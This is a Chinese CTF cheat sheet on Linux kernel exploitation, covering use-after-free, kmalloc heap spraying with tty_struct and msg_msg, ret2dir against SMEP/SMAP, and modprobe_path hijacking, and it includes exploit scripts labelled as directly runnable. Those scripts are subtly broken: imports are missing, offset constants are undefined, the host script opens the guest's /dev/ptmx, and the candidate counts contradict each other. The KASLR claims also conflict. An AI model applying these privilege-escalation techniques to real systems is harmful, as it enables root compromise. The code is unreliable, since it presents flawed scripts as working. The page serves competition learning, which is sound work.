---
title: 内核 pwn 进阶 —— kernel UAF、kmalloc-* 堆喷与 ret2dir
category: pwn
tags: [kernel pwn, UAF, heap spray, ret2dir, tty_struct]
signals: [题目给 run.sh 启动 qemu 和 kernel 镜像, 交互动的是 /dev 下的自定义字符设备, ioctl 里有 copy_from_user 和 kmalloc, 目标是在内核态拿到 root 或读 flag, 内核版本 5.x 且开了 SMEP SMAP KASLR, 需要绕过从用户态直接执行内核代码的限制]
difficulty: hard
source: "CTF-Wiki 内核 pwn / ret2dir 论文 / xairy linux-kernel-exploitation"
tools: [pwntools, qemu-system-x86_64, gdb, extract-vmlinux, kernelpwn工具集]
updated: 2026-10-23
---

## 一、识别信号（题面长什么样）

- 附带 `run.sh`：`qemu-system-x86_64 -m 64M -kernel ./bzImage -initrd ./rootfs.cpio ...`。
- `rootfs.cpio` 里有 `/init` 与一个自研模块（`xxx.ko`），`ls /dev` 能看到对应设备节点。
- 模块的 `ioctl` 里有 `kmalloc`/`kfree` 与 `copy_from_user`/`copy_to_user`。
- 内核启动参数里出现 `smep smap kaslr`（可能还有 `kpti`）。
- 目标是「读 `/flag`」或「`/bin/sh` 拿到 root」。
- 题目**没有开 `CONFIG_RANDOMIZE_BASE`** 或故意在 `dmesg` 里打印了基址。

## 二、原理

### 1. SLUB 与 kmalloc-* 缓存

内核堆按大小分 `kmalloc-8/16/32/64/96/128/192/256/512/1k/2k/4k...`。
每次 `kmalloc(n)` 从对应大小的 freelist 取对象。**同一缓存里的对象大小相同，填满后可预测布局**。

### 2. kernel UAF

```c
// 模块常见漏洞形态
static long ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
    case ALLOC:  buf = kmalloc(size, GFP_KERNEL); break;
    case FREE:   kfree(buf); /* 忘记 buf = NULL */    break;
    case EDIT:   copy_from_user(buf, arg, size); break;  // ← 对已释放对象写入
    case SHOW:   copy_to_user(arg, buf, size); break;    // ← 读已释放对象
    }
}
```

`free` 后对象仍在 `kmalloc-*` 的 freelist 上，若 slug 为空，下一次 `kmalloc` 会复用同一块。
利用方式是「**释放 → 堆喷 → 用目标对象占据该内存 → UAF 读写其函数指针**」。

### 3. 堆喷（heap spray）

Linux 内核里常见的可喷射对象：

| 对象 | 大小 | 能控制什么 |
| --- | --- | --- |
| `struct tty_struct` | `0x2e0`（kmalloc-1024） | **`ops` 函数表指针**（→ `tty_operations`）|
| `struct seq_operations` | `0x20` | `start/next/stop/show` 四个函数指针 |
| `struct msg_msg` | `0x30 ~ 0x1000` | 内核消息队列，可控制 data |
| `struct pipe_buffer` | `0x28`（kmalloc-1024 里的数组） | `ops` 指针 |
| `struct subprocess_info` | ~`0x60` | `work.func` |
| `struct timerfd_ctx` | ~`0xd8` | 回调 |

打开 `/proc/self/stat`、`/dev/ptmx`、`msgsnd`、`pipe()` 都能触发对应分配。

### 4. ret2dir（Return-to-Direct-Mapped Memory）

现代内核都有 **SMEP**（禁止内核执行用户页）和 **SMAP**（禁止内核读写用户页）。
但 physmap（direct map，`0xffff888000000000` 起）把**所有物理页**线性映射进内核地址空间。
用户页同样在 physmap 里有一份别名：

```
用户态虚拟地址 user_va → 物理页 frame
physmap 地址 = 0xffff888000000000 + frame_offset   （有偏移时加 physmap_base）
```

于是可以把 shellcode 放在用户空间，然后让内核 `ret` 到 **physmap 中同一物理页的别名地址** ——
SMEP 检查的是「页表 U/S 位」，别名映射是内核页，**检查通过**。这就是 ret2dir。

实际使用要点：

- 需要知道 `physmap_base`（KASLR 会随机化）和物理地址。CTF 常用 **`0xffff888000000000` 固定偏移 + 多喷 256 个页 + 每个页跳板扫描**，因为偏移只有 `1GB` 粒度随机。
- 或者先用 `msgsnd` 喷一张可控页，再用 `/proc/self/pagemap` 读物理帧（需要权限，CTF 里通常给 root）。

### 5. 环境搭建

```bash
mkdir rootfs && cd rootfs && cpio -idmv < ../rootfs.cpio   # 解包
find . -perm -4000 && cat etc/passwd                        # 找 setuid / 用户
./extract-vmlinux bzImage > vmlinux                         # 拿符号
qemu-system-x86_64 -m 128M -kernel bzImage -initrd rootfs.cpio -nographic \
  -append "console=ttyS0 kaslr" -gdb tcp::1234 -S            # 调试启动
```

## 三、解题步骤

1. **还原环境**：解包 cpio，确认 `/init` 的 uid 与 `setuid`，找模块的 `ko`。
2. **定位驱动**：`modinfo xxx.ko`、`nm -C xxx.ko | head`，在 IDA 里看 `ioctl`。
3. **找漏洞**：`kfree` 不置空 → UAF；`copy_from_user` 长度不受控 → 堆溢出；`size` 有符号比较 → 溢出。
4. **泄漏内核基址**：
   - `/sys/module/xxx/sections/.text`（需要 root 或有读权限）
   - `dmesg` 里若打印了指针
   - 通过 UAF 读 `tty_struct` 的 `ops` 指针（指向 `ptm_unix98_lookup` 等固定符号）
5. **堆喷占位**：`open("/dev/ptmx")` 喷 `tty_struct`，或 `msgsnd` 喷 `msg_msg`。
6. **劫持控制流**：改 `ops->ioctl` 或 `seq_operations->start`，指向 ROP / `commit_creds(prepare_kernel_cred(0))`。
7. **绕过 SMEP/SMAP**：ROP 用 `native_write_cr4(0x6f0)` 关 SMEP，或 ret2dir 直接跳 physmap。
8. **返回用户态**：用 `swapgs_restore_regs_and_return_to_usermode` 保存并恢复用户上下文。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# kernel UAF + tty_struct 堆喷 + modprobe_path 劫持（或 commit_creds ROP）
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

# ---------- 0. 启动 ----------
def start():
    cmd = ('qemu-system-x86_64 -m 64M -kernel ./bzImage -initrd ./rootfs.cpio '
           '-nographic -append "console=ttyS0 kaslr" -gdb tcp::1234')
    return process(cmd.split())

io = start()

def write_file(name, data):
    """向 rootfs 里写 files（busybox 环境用 base64 传）"""
    payload = base64.b64encode(data)
    io.sendline(f'echo {payload.decode()} | base64 -d > {name}'.encode())

def alloc(size):  io.sendline(b'1'); io.sendline(str(size).encode())
def free(i):      io.sendline(b'2'); io.sendline(str(i).encode())
def edit(i, d):   io.sendline(b'3'); io.sendline(str(i).encode()); io.send(d)
def show(i):      io.sendline(b'4'); io.sendline(str(i).encode())

# ---------- 1. 触发 UAF ----------
alloc(0x2e0)          # 0: 大小对齐 tty_struct
free(0)               # kfree 后指针未置空 → UAF

# ---------- 2. 堆喷 tty_struct ----------
fds = []
for _ in range(32):
    fds.append(open('/dev/ptmx', 'r+b', buffering=0))

# ---------- 3. 读 UAF 对象，泄漏内核基址 ----------
show(0)
leak = u64(io.recv(8).ljust(8, b'\x00'))
log.success(f'leaked = {hex(leak)}')
# tty_struct->magic = 0x5401，ops 指向 ptm_unix98_ops
kernel_base = leak - PTM_OPS_OFFSET   # ptm_unix98_ops 相对 kernel 基址的偏移

# ---------- 4. 写 modprobe_path（更稳，不需要 ROP） ----------
modprobe_path = kernel_base + MODPROBE_OFFSET   # nm vmlinux | grep modprobe_path
# 若 UAF 的 edit 可写到任意地址（堆喷/任意写原语），直接把 modprobe_path 改成 /tmp/x
# 否则改 tty_struct->ops 指向伪造表，走 commit_creds ROP（见下一段骨架）
write_file('/tmp/x', b'#!/bin/sh\ncat /flag > /tmp/flag\nchmod 777 /tmp/flag\n')
write_file('/tmp/y', b'\xff\xff\xff\xff')   # 未知二进制 → 内核调 modprobe
io.sendline(b'chmod +x /tmp/x /tmp/y; /tmp/y')
io.sendline(b'cat /tmp/flag')
io.interactive()
```

### ret2dir 的最小骨架

```python
from pwn import *

# 1) 在用户态准备一张整页的 shellcode 跳板
page = mmap(0x10000000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0)
shellcode = asm(shellcraft.amd64.linux.sh())
page[:len(shellcode)] = shellcode

# 2) 计算 physmap 别名地址（需要 physmap_base 与物理帧）
#    多喷 256 页后按 0x1000 步进探测：
for i in range(256):
    physmap_alias = PHYSBASE + (user_phys + i * 0x1000)
    try_rop(physmap_alias)        # 失败就继续下一个

# 3) 2048 个候选页里必有一个命中 —— 这就是 ret2dir 的"暴力破解"
```

## 五、常见坑 / 变体

1. **`smep/smap` 要看清启动参数**：`cat /proc/cmdline` 从 rootfs 的 `init` 里能确认；没开 SMEP 时直接 `ret2usr` 更简单。
2. **`kaslr` 一旦开启，`physmap_base` 也随机** —— ret2dir 需要额外泄漏，或采用 `0xffff888000000000` + 1GB 步进的暴力搜索。
3. **`tty_struct` 的 `ops` 是只读段**：改 `ops` 指向的值需要「伪造 `tty_operations` 表」在 `.bss` 或堆上。
4. **`modprobe_path` 的偏移**：不同内核镜像差异大，必须用 `vmlinux` 算（`nm vmlinux | grep modprobe_path`）。
5. **`commit_creds/prepare_kernel_cred` 需要 `kpti` 的处理**：`kpti=1` 时返回用户态必须走 `swapgs_restore_regs_and_return_to_usermode`。
6. **`CONFIG_STATIC_USERMODEHELPER`** 打开时 `modprobe_path` 失效，只能走 ROP。
7. **UAF 后 `show` 可能拿到全 0**：说明对象还没被喷到，增加 spray 数量或改变顺序。
8. **cross-cache attack**：若目标结构与受害者不在同一 `kmalloc-*`，需要用 `mmap`/`munmap` 释放整页把 slab 页还回去 —— 这是高阶变体。
9. **`userfaultfd` 竞态**：`copy_from_user` 时致命页错误可制造 double fetch，见 CTF-Wiki double-fetch 章节。

## 六、参考来源

- [CTF-Wiki：内核 UAF](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/)
- [CTF-Wiki：内核 Heap Spray](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/spray/)
- [CTF-Wiki：ret2dir](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2dir/)
- [ret2dir 论文：Rethinking Kernel Isolation (USENIX Security 2014)](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf)
- [xairy/linux-kernel-exploitation（内核漏洞利用资料总集）](https://github.com/xairy/linux-kernel-exploitation)
- [Fernweh：Linux Kernel PWN 05 ret2dir](https://blog.wohin.me/posts/linux-kernel-pwn-05/)
